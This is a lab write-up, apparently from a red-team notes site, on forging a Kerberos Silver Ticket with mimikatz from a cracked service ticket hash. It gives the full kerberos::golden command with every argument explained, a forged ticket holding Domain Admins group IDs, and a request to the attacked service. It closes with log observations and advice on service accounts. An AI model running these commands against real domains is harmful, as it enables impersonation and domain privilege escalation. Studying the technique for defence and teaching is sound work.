[Credential Access]()

This lab looks at the technique of forging a cracked TGS Kerberos ticket in order to impersonate another user and escalate privileges from the perspective of a service the TGS was cracked for.

This lab builds on the explorations in [T1208: Kerberoasting](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting) where a TGS ticket got cracked.

## Execution

I will be using mimikatz to create a Kerberos Silver Ticket - forging/rewriting the cracked ticket with some new details that benefit me as an attacker.&#x20;

Below is a table with values supplied to mimikatz explained and the command itself:

| Argument                                            | Notes                                                                                             |
| --------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 | SID of the current user who is forging the ticket. Retrieved with `whoami /user`                  |
| /target:dc-mantvydas.offense.local                  | server hosting the attacked service for which the TGS ticket was cracked                          |
| /service:http                                       | service type being attacked                                                                       |
| /rc4:a87f3a337d73085c45f9416be5787d86               | NTLM hash of the password the TGS ticket was encrypted with. `Passw0rd` in our case               |
| /user:beningnadmin                                  | Forging the user name. This is the user name that will appear in the windows security logs - fun. |
| /id:1155                                            | Forging user's RID - fun                                                                          |
| /ptt                                                | Instructs mimikatz to inject the forged ticket to memory to make it usable immediately            |

Getting our user's SID as explained in the first step in the above table:

![](assets/Kerberos%20Silver%20Tickets.png)
Issuing the final mimikatz command to create our forged (silver) ticket:

**attacker\@victim**

```csharp
mimikatz # kerberos::golden /sid:S-1-5-21-4172452648-1021989953-2368502130-1105 /domain:offense.local /ptt /id:1155 /target:dc-mantvydas.offense.local /service:http /rc4:a87f3a337d73085c45f9416be5787d86 /user:beningnadmin
```



Checking available tickets in memory with `klist` - note how the ticket shows our forged username `benignadmin` and a forged user id:

![](assets/Kerberos%20Silver%20Tickets-1.png)

Note in the above mimikatz window the `Group IDs` which our fake user `benignadmin` is now a member of due to the forged ticket:

| GID | Group Name                  |
| --- | --------------------------- |
| 512 | Domain Admins               |
| 513 | Domain Users                |
| 518 | Schema Admins               |
| 519 | Enterprise Admins           |
| 520 | Group Policy Creator Owners |

![](assets/Kerberos%20Silver%20Tickets-2.png)
Initiating a request to the attacked service with a TGS ticket - note that the authentication is successfull:

**attacker\@victim**

```csharp
Invoke-WebRequest -UseBasicParsing -UseDefaultCredentials http://dc-mantvydas.offense.local
```


![](assets/Kerberos%20Silver%20Tickets-3.png)
## Observations

Note a network logon from `benignadmin` as well as forged RIDs:

![](assets/Kerberos%20Silver%20Tickets-4.png)
It is better not to use user accounts for running services on them, but if you do, make sure to use really strong passwords! Computer accounts generate long and complex passwords and they change frequently, so they are better suited for running services on. Better yet, follow good practices such as using [Group Managed Service Accounts](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh831782\(v=ws.11\)) for running more secure services.

## References

**Silver Ticket Attack | Netwrix:** {% embed url="<https://blog.stealthbits.com/impersonating-service-accounts-with-silver-tickets>" %}

**How Attackers Use Kerberos Silver Ticket to Exploit Systems:** {% embed url="<https://adsecurity.org/?p=2011>" %}
